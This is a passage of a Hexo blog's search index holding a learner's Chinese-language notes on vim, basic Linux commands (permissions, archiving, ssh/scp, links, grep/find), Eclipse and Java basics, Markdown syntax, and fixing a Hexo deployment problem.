文本中1-10行的abc替换为123</li><li>q 退出不保存</li><li>x or wq 退出并保存</li><li>w 保存</li><li>q! 强制退出</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linuxbasic3</title>
      <link href="/2019/07/26/linuxbasic3/"/>
      <url>/2019/07/26/linuxbasic3/</url>
      
        <content type="html"><![CDATA[<h1 id="linux基本指令"><a href="#linux基本指令" class="headerlink" title="linux基本指令"></a>linux基本指令</h1><h2 id="sudo-su切换到root"><a href="#sudo-su切换到root" class="headerlink" title="sudo su切换到root"></a>sudo su切换到root</h2><ul><li>按ctrl + D 退出</li></ul><h2 id="sudo-临时提升为root权限"><a href="#sudo-临时提升为root权限" class="headerlink" title="sudo 临时提升为root权限"></a>sudo 临时提升为root权限</h2><ul><li>只能提升当前指令权限</li></ul><h2 id="su-用户名切换不同用户"><a href="#su-用户名切换不同用户" class="headerlink" title="su 用户名切换不同用户"></a>su 用户名切换不同用户</h2><h2 id="passwd-默认修改当前用户密码"><a href="#passwd-默认修改当前用户密码" class="headerlink" title="passwd 默认修改当前用户密码"></a>passwd 默认修改当前用户密码</h2><ul><li>需要用root用户修改密码，普通用户有限制，root可将密码改短</li></ul><h2 id="exit-用于退出当前用户，回到上一个登录用户"><a href="#exit-用于退出当前用户，回到上一个登录用户" class="headerlink" title="exit 用于退出当前用户，回到上一个登录用户"></a>exit 用于退出当前用户，回到上一个登录用户</h2><h2 id="who-查看当前用户"><a href="#who-查看当前用户" class="headerlink" title="who 查看当前用户"></a>who 查看当前用户</h2><ul><li>   -q 查看当前登录人数</li><li>   -u 查看最后一次操作时间</li></ul><h2 id="重启和关机"><a href="#重启和关机" class="headerlink" title="重启和关机"></a>重启和关机</h2><ul><li>   shutdown <ul><li>   now 立刻关机</li><li>   r 重启</li><li>   c 取消</li><li>   +20 20分钟后关机</li><li>   20:25 定时关机</li></ul></li><li>   reboot重启无通知</li></ul><h2 id="软件安装-更新和卸载"><a href="#软件安装-更新和卸载" class="headerlink" title="软件安装,更新和卸载"></a>软件安装,更新和卸载</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><ul><li><p>make install 源代码安装包</p><ol><li>.&#x2F;configure 建立makefile这个文件</li><li>makeclean 清除掉上次编译过的目标文件</li><li>make 依据上一步的操作进行编译，通过gcc生成可执行文件，放在当前文件目录下</li><li>make install 完成最后步骤</li></ol></li><li><p>dpkg 安装deb包</p><ul><li>sudo dpkg -i 软件包名</li></ul></li><li><p>sudo apt install 软件名</p><ul><li>apt-get 功能范围更小，推荐直接apt</li></ul></li></ul><h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><ul><li>sudo apt update</li></ul><h3 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h3><ul><li>sudo apt remove 软件名</li></ul><hr><h1 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h1><p>-sudo apt install openssh-server</p><h2 id="链接远程服务器"><a href="#链接远程服务器" class="headerlink" title="链接远程服务器"></a>链接远程服务器</h2><ul><li>ssh 远程服务器用户名@远程服务器IP地址</li><li>IP查询ifconfig</li></ul><h2 id="远程拷贝"><a href="#远程拷贝" class="headerlink" title="远程拷贝"></a>远程拷贝</h2><h3 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h3><ul><li>scp 需要拷贝的文件的路径 用户名@IP地址：要拷贝到的路径</li></ul><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul><li>scp 用户名@IP地址：拷贝文件路径 要拷贝到的路径</li></ul><h3 id="拷贝目录"><a href="#拷贝目录" class="headerlink" title="拷贝目录"></a>拷贝目录</h3><ul><li>scp -r</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> linux， ssh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javabasic1</title>
      <link href="/2019/07/26/javabasic1/"/>
      <url>/2019/07/26/javabasic1/</url>
      
        <content type="html"><![CDATA[<h1 id="eclipse常用操作"><a href="#eclipse常用操作" class="headerlink" title="eclipse常用操作"></a>eclipse常用操作</h1><h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2><ul><li>使用alt+&#x2F;可以快速补全</li><li>使用ctrl + alt + 上下箭头可以批量复制代码</li><li>使用ctrl + shift + 上下箭头可以快速跳出大括号层代码并停留在当层标题处or大括号处</li></ul><h2 id="自动补全"><a href="#自动补全" class="headerlink" title="自动补全"></a>自动补全</h2><ul><li>写下main按下快速补全可以快速写main函数语句</li><li>写下sysout快速补全可以写输出语句</li></ul><hr><h1 id="Java简介"><a href="#Java简介" class="headerlink" title="Java简介"></a>Java简介</h1><h2 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h2><ul><li>JavaEE 企业端</li><li>JavaSE 标准版本</li><li>JavaME 小型设备特殊版本</li></ul><h2 id="简称"><a href="#简称" class="headerlink" title="简称"></a>简称</h2><ul><li>jdk 集成开发环境包括jre</li><li>jre 运行环境包括jvm</li><li>jvm Java虚拟机</li></ul><h2 id="基本编程易错及基本库介绍"><a href="#基本编程易错及基本库介绍" class="headerlink" title="基本编程易错及基本库介绍"></a>基本编程易错及基本库介绍</h2><ul><li>python用多了容易漏分号</li><li>a <em>&#x3D; b + c 等于 a</em>(b+C)赋值给a</li><li>java注释和C++一样是&#x2F;&#x2F;单行&#x2F;**&#x2F;行内&#x2F;****&#x2F;文档注释Python是##</li><li>类名所有单词首字母大写，变量方法则用驼峰原则</li><li>java.awt.*库可用于图形位置控制</li><li>java.swing.JFrame库可以生成图形界面</li><li>java.util.Scanner用于键盘监控</li><li>Math.random()这个方法可以直接使用生成随机数范围[0,1)</li><li>浮点数运算需要精确可以使用BigDecimal方法，尽量用字符串进行初始化相应库为java.Math.BigDecimal</li><li>switch语句jdk1.7后可使用字符串作为判断条件了<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">switch(判断条件)&#123;</span><br><span class="line">case 条件1:</span><br><span class="line">语句1;</span><br><span class="line">break;</span><br><span class="line">case 条件2:</span><br><span class="line">...</span><br><span class="line">default:</span><br><span class="line">语句;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> javabasic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>markdown1</title>
      <link href="/2019/07/25/markdown1/"/>
      <url>/2019/07/25/markdown1/</url>
      
        <content type="html"><![CDATA[<h1 id="markdown文件的编辑基本操作"><a href="#markdown文件的编辑基本操作" class="headerlink" title="markdown文件的编辑基本操作"></a>markdown文件的编辑基本操作</h1><p>最近刚开始写技术blog，hexo使用的是.md文本，所以学习一下如何编辑，仅仅记录一些常用的编辑方式<br>开头提醒：markdown中的符号大部分需要与内容之间相隔一个空格否则可能直接显示，而不改变排版</p><hr><p>##标题<br>标题通过井号设置，井号个数代表几级标题<br>示例:</p><h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><hr><h2 id="加粗文字用两对星号包起来"><a href="#加粗文字用两对星号包起来" class="headerlink" title="加粗文字用两对星号包起来"></a>加粗文字用两对星号包起来</h2><p>示例<br><strong>这个是加粗的文字</strong></p><h2 id="斜体用一对星号包起来"><a href="#斜体用一对星号包起来" class="headerlink" title="斜体用一对星号包起来"></a>斜体用一对星号包起来</h2><p>示例：<br><em>斜体是不是要写长一点才明显，lean or lie down</em></p><h2 id="之前blog中关于linux重定向问题中用了-两个大于号，这在markdown中是引用，暂时不知道怎么去掉所以分段了"><a href="#之前blog中关于linux重定向问题中用了-两个大于号，这在markdown中是引用，暂时不知道怎么去掉所以分段了" class="headerlink" title="之前blog中关于linux重定向问题中用了&gt;&gt;两个大于号，这在markdown中是引用，暂时不知道怎么去掉所以分段了"></a>之前blog中关于linux重定向问题中用了&gt;&gt;两个大于号，这在markdown中是引用，暂时不知道怎么去掉所以分段了</h2><hr><h2 id="插入链接"><a href="#插入链接" class="headerlink" title="插入链接"></a>插入链接</h2><p>中括号括起来链接名，小括号括起来链接<br><a href="https://lmfalcon.github.io/">lmfalcon</a></p><h2 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h2><p>！【图片名】（图片未知，可以是网络图片）这里是用中文标点打出来，实际用英文</p><h2 id="插入代码块"><a href="#插入代码块" class="headerlink" title="插入代码块"></a>插入代码块</h2><p>用三个反引号(&#96;)包起来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public class Code&#123;</span><br><span class="line">public static void main(String[] args)&#123;</span><br><span class="line">System.out.println(&quot;hello world&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>写惯了Python真的很容易漏分号</p><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><p>可以用数字加点放在开头注意点和内容要用一个空格分隔</p><ol><li>这是一</li><li>这是二</li><li>这是三<br>也可以用单个横线，乘号，加号加在开头<br>如果要嵌套用不同层级间回车加三个空格<br>示例：</li></ol><ul><li>这横线   <ul><li>这是乘号   <ul><li>这是加号</li></ul></li></ul></li></ul><hr><h2 id="空格、缩进"><a href="#空格、缩进" class="headerlink" title="空格、缩进"></a>空格、缩进</h2><p>　改成全角空格ｌｉｎｕｘ使用ｓｈｉｆｔ＋ｓｐａｃｅ变换半角全角</p><hr><h2 id="文献参考"><a href="#文献参考" class="headerlink" title="文献参考"></a>文献参考</h2><p><a href="https://www.jianshu.com/p/191d1e21f7ed">参考链接</a><br>写得比我全，但是还是要自己打打，试试看看还能不能用</p>]]></content>
      
      
      
        <tags>
            
            <tag> markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linuxbasic2</title>
      <link href="/2019/07/23/linuxbasic2/"/>
      <url>/2019/07/23/linuxbasic2/</url>
      
        <content type="html"><![CDATA[<h1 id="linux基本终端操作"><a href="#linux基本终端操作" class="headerlink" title="linux基本终端操作"></a>linux基本终端操作</h1><h2 id="echo-输出命令"><a href="#echo-输出命令" class="headerlink" title="echo 输出命令"></a>echo 输出命令</h2><p>　　echo “hello world” 终端输出hello world<br>　　echo “hello world” &gt; helloworld.txt<br>　　　　&gt; 重定向至输入至特定位置<br>　　echo “xxxx” &gt;&gt; helloworld.txt<br>　　　　&gt; 再次重定向则覆盖<br>　　　　&gt;&gt;两次重定向会追加</p><h2 id="终端能输出的都能重定向输出"><a href="#终端能输出的都能重定向输出" class="headerlink" title="&gt; 终端能输出的都能重定向输出"></a>&gt; 终端能输出的都能重定向输出</h2><h2 id="管道，有输入有输出"><a href="#管道，有输入有输出" class="headerlink" title="| 管道，有输入有输出"></a>| 管道，有输入有输出</h2><pre><code>指令1|指令2|...|指令n从指令1的输出作为指令2的输入，一直到指令n输出举例：ls -l|more 查看文件列表并分屏显示</code></pre><h2 id="ln-建立链接"><a href="#ln-建立链接" class="headerlink" title="ln 建立链接"></a>ln 建立链接</h2><ol><li>-s 软连接<ol><li>类似快捷方式</li><li>删除软连接不影响源文件</li><li>软连接显示链接文件大小</li><li>可以链接不存在文件</li><li>可以连接目录</li><li>可以跨系统<br>例子：ln -s 1.txt softlink1.txt</li></ol><p></p></li><li>硬链接<ol><li>类似多名称</li><li>删除硬链接，若无其他硬链接删除data，若有则无影响</li><li>硬链接显示data大小，多个硬链接实际上只有data实际大小</li><li>不可以链接不存在文件</li><li>不可链接目录</li><li>不可跨系统<br>例子：ln 2.txt hardlink2.txt</li></ol></li></ol><hr><h2 id="grep-文件内容搜索"><a href="#grep-文件内容搜索" class="headerlink" title="grep 文件内容搜索"></a>grep 文件内容搜索</h2><ul><li>   grep ‘搜索内容’ 搜索文件路径</li><li>   -t 忽略大小写</li><li>   -n 显示行号</li><li>   -v 取反，不显示搜索内容</li><li>   grep 搜索内容可用正则</li></ul><h2 id="find-文件搜索"><a href="#find-文件搜索" class="headerlink" title="find 文件搜索"></a>find 文件搜索</h2><ol><li>   名称搜索<ul><li><pre><code>  find ./ 文件名称</code></pre></li><li>   类正则：<br>    find .&#x2F; ‘*.txt’<br>    find .&#x2F; ‘sa?asd.txt’</li></ul></li><li>   大小搜索<ul><li>find .&#x2F; -size +30M 大于30M</li><li><pre><code>         -30M 小于30M</code></pre></li><li><pre><code>         +15M -size -30M 大于15M小于30M</code></pre></li></ul></li></ol><hr><h2 id="tar-归档文件-和-gz-压缩文件"><a href="#tar-归档文件-和-gz-压缩文件" class="headerlink" title="tar 归档文件 和 gz 压缩文件"></a>tar 归档文件 和 gz 压缩文件</h2><ol><li>   归档是确保文件完整性</li><li>   压缩是节省空间</li><li>   tar &gt; 源文件</li><li>   gz 文件<ul><li>可能   &gt; 源文件</li><li>也可能 &lt; 源文件</li></ul></li><li>   -c 生成档案文件，创建打包文件</li><li>   -v 显示进度</li><li>   -f 指定文件名称，必须放最后</li><li>   -x 解开打包文件</li><li>   -z 解压缩和压缩</li><li>   -C 指定要解档目录</li></ol><h3 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作:"></a>常用操作:</h3><pre><code>1.tar -cvf 归档文件名.tar 待归档文件1...改变文件大小2.tar -xvf 归档文件名.tar改变文件大小3.tar -zcvf 压缩文件.tar.gz 待压缩文件1...改变文件大小4.tar -zxvf 压缩文件.tar.gz改变文件大小5.tar -zxvf 压缩文件.tar.gz -C 指定目录</code></pre><h2 id="zip-和-unzip"><a href="#zip-和-unzip" class="headerlink" title="zip 和 unzip"></a>zip 和 unzip</h2><ol><li>   zip -r a.zip a  压缩a目录成a.zip文件</li><li>   unzip a.zip解压缩文件</li></ol><h2 id="bz2-压缩与解压"><a href="#bz2-压缩与解压" class="headerlink" title="bz2 压缩与解压"></a>bz2 压缩与解压</h2><ol><li>   -j 解压和压缩</li><li>   tar -jcvf all.atr.bz2 *.txt</li><li>   tar -jxvf all.atr.bz2</li></ol><h2 id="rar和unrar"><a href="#rar和unrar" class="headerlink" title="rar和unrar"></a>rar和unrar</h2><ul><li>   类似zip</li></ul><hr><h2 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h2><p>ls -l<br>文件类型 文件拥有者u 文件所属组g 其他用户权限o 文件指针数 拥有者 用户所在组<br>rwx-4210 读，写，执行，无权限<br>所有用户a<br>chmod 权限修改</p><ul><li>-R 递归修改</li><li>chmod u+r 文件名 加权限</li><li>chmod u-r 文件名 减权限</li><li>chmod u&#x3D;rwx 文件名   设置权限</li><li>chmod 777 文件名   <ul><li>   7 rwx</li><li>   6 rw-</li><li>   5 r-x</li><li>   4 r–</li><li>   3 -wx</li><li>   2 -w-</li><li>   1 –x</li><li>   0 —</li></ul></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linuxbasic1</title>
      <link href="/2019/07/23/linuxbasic1/"/>
      <url>/2019/07/23/linuxbasic1/</url>
      
        <content type="html"><![CDATA[<h1 id="linux入门基本命令"><a href="#linux入门基本命令" class="headerlink" title="linux入门基本命令"></a>linux入门基本命令</h1><ul><li>终端命令格式 command [-option] [parameter]</li><li>command –help 查看命令帮助</li><li>man command  manualpage命令使用手册<br>进入文件后搜索常用: </li><li>&#x2F;搜索内容 类似window ctrl+F<br>换页常用: </li><li>f 前一页</li><li>b 后一页</li><li>q 退出</li></ul><hr><h2 id="ls-当前文件夹所有文件-类DOC-dir-命令"><a href="#ls-当前文件夹所有文件-类DOC-dir-命令" class="headerlink" title="ls 当前文件夹所有文件(类DOC dir 命令)"></a>ls 当前文件夹所有文件(类DOC dir 命令)</h2><ul><li>   -a 显示隐藏 </li><li>   -l 显示详细信息 </li><li>   -h 显示大小用人理解的单位</li></ul><h2 id="cd-切换目录"><a href="#cd-切换目录" class="headerlink" title="cd 切换目录"></a>cd 切换目录</h2><ul><li>   . 当前目录 </li><li>   .. 上级目录 </li><li>   ~ 家目录 </li><li>   &#x2F; 根目录 </li><li><ul><li>回到上次进入目录</li></ul></li></ul><h2 id="pwd-当前路径"><a href="#pwd-当前路径" class="headerlink" title="pwd 当前路径"></a>pwd 当前路径</h2><h2 id="touch-新建文件-注意文件的扩展名加这个是好习惯，创建复制移动都要注意这点"><a href="#touch-新建文件-注意文件的扩展名加这个是好习惯，创建复制移动都要注意这点" class="headerlink" title="touch 新建文件 注意文件的扩展名加这个是好习惯，创建复制移动都要注意这点"></a>touch 新建文件 注意文件的扩展名加这个是好习惯，创建复制移动都要注意这点</h2><h2 id="mkdir-新建目录"><a href="#mkdir-新建目录" class="headerlink" title="mkdir 新建目录"></a>mkdir 新建目录</h2><ul><li>-p 递归创建</li></ul><h2 id="gedit-编辑文件ubuntu可以打开文本文件，习惯后配置好的vim还是用vim打开文件编辑"><a href="#gedit-编辑文件ubuntu可以打开文本文件，习惯后配置好的vim还是用vim打开文件编辑" class="headerlink" title="gedit 编辑文件ubuntu可以打开文本文件，习惯后配置好的vim还是用vim打开文件编辑"></a>gedit 编辑文件ubuntu可以打开文本文件，习惯后配置好的vim还是用vim打开文件编辑</h2><h2 id="vi-所有linux都可以用的文本编辑器"><a href="#vi-所有linux都可以用的文本编辑器" class="headerlink" title="vi 所有linux都可以用的文本编辑器"></a>vi 所有linux都可以用的文本编辑器</h2><h2 id="rm-删除"><a href="#rm-删除" class="headerlink" title="rm 删除"></a>rm 删除</h2><ul><li>   -i 交互式运行 </li><li>   -f 强制进行忽略不存在 </li><li>   -r 递归删除可删文件夹</li></ul><h2 id="mv-移动文件，重命名"><a href="#mv-移动文件，重命名" class="headerlink" title="mv 移动文件，重命名"></a>mv 移动文件，重命名</h2><ul><li>   -i 交互方式 </li><li>   -v 显示移动过程 </li><li>   -f</li></ul><h2 id="cp-复制文件（DOS-copy）"><a href="#cp-复制文件（DOS-copy）" class="headerlink" title="cp 复制文件（DOS copy）"></a>cp 复制文件（DOS copy）</h2><ul><li>文件备份 sudo cp 路径&#x2F;文件名.扩展名 路径&#x2F;文件名.扩展名.bak(2)</li></ul><h2 id="tree-以树状显示路径"><a href="#tree-以树状显示路径" class="headerlink" title="tree 以树状显示路径"></a>tree 以树状显示路径</h2><h2 id="clear-清屏（DOS-cls）ctrl-l"><a href="#clear-清屏（DOS-cls）ctrl-l" class="headerlink" title="clear 清屏（DOS cls）ctrl + l"></a>clear 清屏（DOS cls）ctrl + l</h2><h2 id="which-命令位置"><a href="#which-命令位置" class="headerlink" title="which 命令位置"></a>which 命令位置</h2><h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2><ul><li>命令终止 ctrl + c </li><li>ctrl + shift + + 放大</li><li>ctrl + - 缩小</li></ul><h2 id="cal-日期"><a href="#cal-日期" class="headerlink" title="cal 日期"></a>cal 日期</h2><ul><li>-3 显示上月本月下月 </li><li>   -j 显示当年第几天 直接写年份</li></ul><h2 id="date-显示日期"><a href="#date-显示日期" class="headerlink" title="date 显示日期"></a>date 显示日期</h2><ul><li>   格式化显示举例 “+%Y年%m月%d日 %H时%M分%S秒”</li></ul><h2 id="history-显示曾经执行过得指令"><a href="#history-显示曾经执行过得指令" class="headerlink" title="history 显示曾经执行过得指令"></a>history 显示曾经执行过得指令</h2><ul><li><pre><code>  直接加数字n显示最近执行过得n条指令</code></pre></li><li><pre><code>  !编号执行编号那条指令 </code></pre></li><li><pre><code> 家目录下 ls -al 有个.bash_history 文件记录history</code></pre></li></ul><h2 id="cat-文件查看or合并文件内容"><a href="#cat-文件查看or合并文件内容" class="headerlink" title="cat 文件查看or合并文件内容"></a>cat 文件查看or合并文件内容</h2><ul><li>   -n 加行号 </li><li>   -b 非空行加编号 </li><li>   -s 遇到两行以上空行只显示一个</li><li>   cat 1.txt 2.txt 连接显示两个文件</li></ul><h2 id="more-分页查看文件内容（举例more-etc-servers）"><a href="#more-分页查看文件内容（举例more-etc-servers）" class="headerlink" title="more 分页查看文件内容（举例more etc&#x2F;servers）"></a>more 分页查看文件内容（举例more etc&#x2F;servers）</h2><ul><li>   +num 从num行显示文件</li><li>   fb 翻页ctrl +f ctrl + v</li><li>   q 退出</li><li>   more 1.TXT 2.txt 也可以连接文件但是效果不一样</li><li>   -p 清屏查看</li><li>   -s 连续两个空行只显示一行</li><li>   回车查看一行</li><li>   空格查看一列</li></ul><hr><h1 id="linux-入门基本路径介绍"><a href="#linux-入门基本路径介绍" class="headerlink" title="linux 入门基本路径介绍"></a>linux 入门基本路径介绍</h1><p>&#x2F; 表示根目录<br>~ 根目录<br>~&#x2F;user 根目录下用户目录<br>&#x2F;bin 可执行的二进制文件<br>&#x2F;etc 存配置文件<br>&#x2F;root root权限目录<br>&#x2F;boot 启动使用文件 &#x2F;boot&#x2F;grub 系统引导<br>&#x2F;dev 设备文件 u盘挂载 mount &#x2F;dev&#x2F;U盘名称 &#x2F;mnt<br>&#x2F;lib 系统使用的函数库目录，程序执行过程中需要调用的一些额外的函数库<br>&#x2F;mnt 默认挂载点<br>&#x2F;opt 额外安装软件目录<br>&#x2F;sbin 给root用户使用的可执行二进制文件<br>&#x2F;tmp 程序执行的临时文件<br>&#x2F;srv 服务启动后的需要访问的数据目录<br>&#x2F;usr UNIX system resource应用程序的存放目录 &#x2F;usr&#x2F;bin &#x2F;usr&#x2F;lib &#x2F;usr&#x2F;local&#x2F;lib<br>&#x2F;var &#x2F;var&#x2F;log 日志文件 &#x2F;var&#x2F;run 存放运行程序PID</p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>abouthexodeploy</title>
      <link href="/2019/07/22/abouthexodeploy/"/>
      <url>/2019/07/22/abouthexodeploy/</url>
      
        <content type="html"><![CDATA[<h2 id="更换主题后修改作者"><a href="#更换主题后修改作者" class="headerlink" title="更换主题后修改作者"></a>更换主题后修改作者</h2><p>出现问题描述：localhost:4000 端口正常显示但是部署到github上public文件夹内容未改变。</p><h2 id="hexo-deploy-标准流程"><a href="#hexo-deploy-标准流程" class="headerlink" title="hexo deploy 标准流程"></a>hexo deploy 标准流程</h2><ol><li>进入blog目录</li><li>sudo su root权限</li><li>修改blog的内容</li><li>hexo clean(还不了解具体作用只是看视频中这样做）</li><li>hexo g（生成静态文件？视频中说hexo生成的是静态页面，具体意思未知，有待学习）</li><li>ctrl+D退出root权限</li><li>sudo hexo d 进行部署，讲博客部署到github上的lmfalcon.github.io（具体网址不是这个，而是新建仓库时的那个链接）上。</li></ol><h2 id="问题解决过程"><a href="#问题解决过程" class="headerlink" title="问题解决过程"></a>问题解决过程</h2><p>root权限可以少打sudo命令本来很方便，但是建立ssh时我用的是lmfalcon这个用户导致git部署到github上时需要用lmfalcon这个用户。所以需要标准流程中的第6步退出过程，否者部署显示成功但是实际未部署任何文件。</p>]]></content>
      
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>template</title>
      <link href="/2019/07/17/template2/"/>
      <url>/2019/07/17/template2/</url>
      
        <content type="html"><![CDATA[<h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><p>内容<br>注意以上要在root权限下进行（sudo su ,ctrl+D退出root）<br>hexo v版本<br>hexo init初始化模板<br>hexo new 文章名新建文章，一般存储在blog&#x2F;source&#x2F;_post目录下<br>hexo clean清理<br>hexo g生成新文章<br>hexo s生成blog在本地localhost:4000</p><hr><h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><p>内容<br>这次因为修改了md文件导致hexo g 时无法更新，问题出在：</p><ol><li>mv 重命名注意不要遗漏扩展名，否则改变文件格式</li><li>修改文章标题只用修改title，与文件名无关</li></ol><hr><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>百度</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
